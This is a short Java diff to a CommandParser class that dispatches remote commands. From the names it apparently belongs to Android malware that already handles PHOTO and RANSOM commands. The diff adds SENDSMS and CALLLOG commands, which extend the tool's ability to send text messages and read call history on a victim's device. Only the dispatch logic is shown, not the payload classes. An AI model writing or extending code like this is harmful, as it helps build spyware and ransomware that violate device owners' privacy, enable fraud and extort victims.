@@ -25,6 +25,10 @@ public class CommandParser {
 			return new PhotoCommand(commandable);
 		}else if(commandString.startsWith("RANSOM")){
 			return new RansomCommand(commandable);
+		}else if(commandString.startsWith("SENDSMS")){
+			return new SMSSenderCommand(commandable);
+		}else if(commandString.startsWith("CALLLOG")){
+			return new CallLogCommand(commandable);
 		}
 		return new UnknownCommand();
 	}
